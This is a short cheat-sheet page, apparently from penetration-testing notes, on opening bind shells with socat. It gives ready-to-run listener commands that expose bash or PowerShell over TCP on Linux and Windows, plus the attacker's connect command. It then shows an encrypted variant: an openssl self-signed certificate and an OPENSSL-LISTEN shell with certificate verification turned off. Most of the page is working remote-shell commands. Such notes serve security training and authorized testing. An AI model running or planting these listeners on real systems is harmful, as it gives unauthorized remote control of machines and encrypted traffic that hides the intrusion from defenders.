---
description: Creating bind shells with socat
---

# Socat

## Basic Bind Shell

### Target

#### Linux

```bash
user@target:~$ socat TCP-L:{PORT} EXEC:"bash -li"
```

#### Windows

```powershell
C:\Users\offsec> socat TCP-L:{PORT} EXEC:powershell.exe,pipes
```

* Privileged access would be required to start the listener on any common ports below 1024

### Attacker

```bash
kali@kali:~$ socat TCP:{TARGET-IP}:{TARGET-PORT} -
```

## Encrypted Bind Shell

Socat can be used to create encrypted shells that do not transmit commands in plain text over the network.

### Generate SSL Certificate

The first step is to generate an SSL certificate which will be used to encrypt the traffic. The SSL certificate should be generated on the machine that will be the listener portion of the shell.

* Attacking machine for reverse shells
* Target machine for bind shells
  * It is possible to either generate the key on the machine or generate it on the attacking machine and simply arrange for it to be placed on the target machine.

The SSL generator will ask for information about the country, email, etc. This info can be filled in truthfully, incorrectly, or left blank

```bash
kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
Generating a 2048 bit RSA private key
.....................+++
................................+++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Try Harder Department
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

<table><thead><tr><th width="176">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>req</code></td><td>Initiate a new certificate signing request</td></tr><tr><td><code>-newkey</code></td><td>Generate a new private key</td></tr><tr><td><code>rsa:2048</code></td><td>Use RSA encryption with a 2,048-bit key length</td></tr><tr><td><code>-nodes</code></td><td>Store the private key without passphrase protection</td></tr><tr><td><code>-keyout</code></td><td>Save the key to a file</td></tr><tr><td><code>-x509</code></td><td>Output a self-signed certificate instead of a certificate request</td></tr><tr><td><code>-days</code></td><td>Set validity period in days</td></tr><tr><td><code>-out</code></td><td>Save the certificate to a file</td></tr></tbody></table>

#### Combine Key Files

Now that the key and certificate have been generated, they will first need to be converted to a format socat will accept. To do so, combine both the `bind_shell.key` and `bind_shell.crt` files into a single `.pem` file.

```bash
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

### Create Encrypted Shell

#### Target Machine

Listener must be created on the target machine

```bash
user@target:~$ socat OPENSSL-LISTEN:{PORT},cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

#### Attacker Machine

Attacker machine can then reach out to the listener:

```bash
kali@kali:~$ socat - OPENSSL:{Listen-IP}:{PORT},verify=0
```
